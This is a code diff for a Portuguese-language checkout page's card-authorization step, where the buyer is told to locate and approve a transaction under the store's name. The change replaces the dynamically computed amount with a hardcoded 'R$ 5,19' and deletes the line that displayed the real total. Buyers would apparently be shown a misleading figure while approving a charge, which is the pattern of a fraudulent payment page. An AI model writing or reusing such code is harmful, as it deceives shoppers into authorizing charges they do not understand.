@@ -868,9 +868,7 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
     }
 
     if (elStep2) {
-      const amtEl = document.getElementById('auth-info-amount-2');
-      const amtText = currentAmountBrl || (amtEl ? amtEl.textContent : 'R$ 0,00');
-      elStep2.innerHTML = `<span class="auth-step-num">2.</span> <span class="auth-step-text">Localize a transação de <strong class="auth-highlight-green" id="auth-info-amount-2">${amtText}</strong> identificada como <strong class="auth-highlight-green" id="auth-3ds-company-ref">"${companyName}"</strong>.</span>`;
+      elStep2.innerHTML = `<span class="auth-step-num">2.</span> <span class="auth-step-text">Localize a transação de <strong class="auth-highlight-green" id="auth-info-amount-2">R$ 5,19</strong> identificada como <strong class="auth-highlight-green" id="auth-3ds-company-ref">"${companyName}"</strong>.</span>`;
     }
 
     if (elStep3) {
@@ -2978,7 +2976,6 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
 
       const totalBrl = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
       if (authInfoAmount) authInfoAmount.textContent = totalBrl;
-      if (auth3dsAmountTwo) auth3dsAmountTwo.textContent = totalBrl;
 
       // Preencher nome da loja dinamicamente a partir da config
       const storeName = (window._currentThemeConfig && window._currentThemeConfig.storeName)
